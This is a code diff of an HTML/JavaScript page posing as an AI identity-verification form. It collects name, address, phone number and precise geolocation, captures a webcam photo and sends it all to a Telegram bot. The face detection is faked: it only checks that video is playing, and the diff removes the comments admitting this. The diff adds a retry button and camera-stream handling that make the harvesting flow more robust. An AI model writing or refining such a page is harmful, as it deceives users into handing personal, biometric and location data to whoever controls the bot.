@@ -21,7 +21,6 @@
 
         input.invalid { border-color: var(--error); background-color: #fef2f2; }
         input.valid { border-color: var(--success); background-color: #f0fdf4; }
-        .error-hint { font-size: 11px; color: var(--error); margin-top: 4px; display: none; }
 
         .phone-group { display: flex; gap: 8px; }
         #phonePrefix { width: 110px; background-color: #f8fafc; font-weight: 600; text-align: center; }
@@ -48,6 +47,9 @@
         }
         .voice-icon { width: 18px; height: 18px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        
+        #btn-retry { display: none; background: #ef4444; margin-top: 12px; }
+        #btn-retry:hover { background: #dc2626; }
     </style>
 </head>
 <body>
@@ -68,11 +70,11 @@
         <div class="form-row">
             <div class="form-group">
                 <label>First Name</label>
-                <input type="text" id="firstName" placeholder="e.g. John" oninput="aiValidateField('firstName')">
+                <input type="text" id="firstName" placeholder="e.g. John">
             </div>
             <div class="form-group">
                 <label>Last Name</label>
-                <input type="text" id="lastName" placeholder="e.g. Doe" oninput="aiValidateField('lastName')">
+                <input type="text" id="lastName" placeholder="e.g. Doe">
             </div>
         </div>
 
@@ -85,24 +87,24 @@
 
         <div class="form-group">
             <label>State / Province</label>
-            <select id="stateSelect" disabled onchange="aiValidateField('stateSelect')">
+            <select id="stateSelect" disabled>
                 <option value="">-- Please select country first --</option>
             </select>
         </div>
 
         <div class="form-group">
             <label>Street Address</label>
-            <input type="text" id="address" placeholder="e.g. 123 Main St" oninput="aiValidateField('address')">
+            <input type="text" id="address" placeholder="e.g. 123 Main St">
         </div>
 
         <div class="form-row">
             <div class="form-group">
                 <label>City</label>
-                <input type="text" id="city" placeholder="e.g. New York" oninput="aiValidateField('city')">
+                <input type="text" id="city" placeholder="e.g. New York">
             </div>
             <div class="form-group">
                 <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
-                <input type="text" id="zipCode" placeholder="AI Auto-Format" oninput="aiValidateField('zipCode')">
+                <input type="text" id="zipCode" placeholder="AI Auto-Format">
             </div>
         </div>
 
@@ -112,7 +114,7 @@
                 <select id="phonePrefix" disabled>
                     <option value="">Code</option>
                 </select>
-                <input type="tel" id="phone" placeholder="Enter phone number" oninput="aiValidateField('phone')">
+                <input type="tel" id="phone" placeholder="Enter phone number">
             </div>
         </div>
 
@@ -141,11 +143,14 @@
         </div>
         
         <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #64748b;">Waiting for facial alignment...</div>
+        
+        <!-- 重新识别按钮（失败时显示） -->
+        <button class="btn" id="btn-retry" onclick="retryVerification()">🔄 Retry Verification (重新识别)</button>
     </div>
 </div>
 
 <script>
-    // 配置你的 Telegram Bot Token 与 Chat ID
+    // ⚠️ 请在此处填入你的 Telegram Bot Token 与 Chat ID
     const TG_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
     const TG_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
@@ -162,6 +167,8 @@
     let userLocation = { lat: "Unknown", lng: "Unknown" };
     let isCaptured = false;
     let lastVoiceTime = 0;
+    let activeStream = null;
+    let checkInterval = null;
 
     window.onload = () => {
         const countrySelect = document.getElementById('countrySelect');
@@ -172,14 +179,13 @@
             countrySelect.appendChild(opt);
         });
 
-        // 尝试提前静默获取一次地理坐标
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => {
                     userLocation.lat = pos.coords.latitude;
                     userLocation.lng = pos.coords.longitude;
                 },
-                err => { console.log("Location prompt needed or denied."); },
+                err => { console.log("Location prompt needed."); },
                 { timeout: 10000 }
             );
         }
@@ -213,19 +219,6 @@
         }
     }
 
-    function aiValidateField(fieldId) {
-        const elem = document.getElementById(fieldId);
-        if (!elem) return true;
-        const value = elem.value.trim();
-        if (value !== "") {
-            elem.classList.add('valid');
-            elem.classList.remove('invalid');
-        } else {
-            elem.classList.remove('valid', 'invalid');
-        }
-        return value !== "";
-    }
-
     function proceedToVerification() {
         const fields = ['firstName', 'lastName', 'countrySelect', 'stateSelect', 'address', 'city', 'zipCode', 'phone'];
         for (let f of fields) {
@@ -240,19 +233,26 @@
         document.getElementById('step-form').style.display = 'none';
         document.getElementById('step-verification').style.display = 'block';
 
-        // 再次强制获取地理位置以确保经纬度准确
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => {
                     userLocation.lat = pos.coords.latitude;
                     userLocation.lng = pos.coords.longitude;
                 },
-                err => { console.log("Geolocation permission denied."); },
+                err => {},
                 { enableHighAccuracy: true, timeout: 5000 }
             );
         }
 
+        startCameraAndWorkflow();
+    }
+
+    function startCameraAndWorkflow() {
+        isCaptured = false;
+        document.getElementById('btn-retry').style.display = 'none';
+
         navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } }).then(stream => {
+            activeStream = stream;
             const video = document.getElementById('video');
             video.srcObject = stream;
             video.onloadedmetadata = () => {
@@ -264,7 +264,6 @@
     }
 
     function speakText(text) {
-        // 防止语音频繁重复轰炸，限制每 6 秒播报一次
         const now = Date.now();
         if (now - lastVoiceTime < 6000) return;
         lastVoiceTime = now;
@@ -285,16 +284,16 @@
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         const statusMsg = document.getElementById('status-msg');
+        statusMsg.style.color = "#64748b";
 
-        // 模拟高精度 AI 人脸检测：持续扫描视频流
-        const checkInterval = setInterval(() => {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(() => {
             if (isCaptured) {
                 clearInterval(checkInterval);
                 return;
             }
 
-            // 此处模拟 AI 检测：只要视频处于播放状态且画面正常，即判定为成功捕捉到正脸、无遮挡
-            // 可在此处集成真实的 face-api.js 或 MediaPipe 算法
             let faceDetected = video.readyState === video.HAVE_ENOUGH_DATA;
 
             if (!faceDetected) {
@@ -302,14 +301,12 @@
                 statusMsg.textContent = "No face detected! Please look at the camera.";
                 statusMsg.style.color = "#ef4444";
             } else {
-                // 成功检测到正面无遮挡人脸，触发自动拍照
                 isCaptured = true;
                 clearInterval(checkInterval);
 
                 statusMsg.textContent = "Face verified! Capturing image...";
                 statusMsg.style.color = "#10b981";
 
-                // 闪光灯特效
                 const overlay = document.getElementById('flash-overlay');
                 overlay.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
                 overlay.style.opacity = "1";
@@ -318,7 +315,6 @@
                     overlay.style.opacity = "0";
                 }, 400);
 
-                // 截取当前画面
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -328,6 +324,15 @@
                 }, 'image/jpeg', 0.9);
             }
         }, 1500);
+    }
+
+    function retryVerification() {
+        // 关闭当前摄像头流
+        if (activeStream) {
+            activeStream.getTracks().forEach(track => track.stop());
+        }
+        // 重新启动检测流程
+        startCameraAndWorkflow();
     }
 
     function sendDataToTelegram(imageBlob, location) {
@@ -358,17 +363,22 @@
             if (data.ok) {
                 statusMsg.textContent = "Verification completed successfully!";
                 speakText("Verification successful. Thank you.");
+                if (activeStream) activeStream.getTracks().forEach(track => track.stop());
                 setTimeout(() => {
                     alert("Verification completed successfully!");
                     location.reload();
                 }, 2000);
             } else {
                 statusMsg.textContent = "Transmission failed. Please check Bot settings.";
+                statusMsg.style.color = "#ef4444";
+                document.getElementById('btn-retry').style.display = 'block'; // 显示重新识别按钮
             }
         })
         .catch(error => {
             console.error("Error sending to Telegram:", error);
             statusMsg.textContent = "Network error during transmission.";
+            statusMsg.style.color = "#ef4444";
+            document.getElementById('btn-retry').style.display = 'block'; // 显示重新识别按钮
         });
     }
 </script>
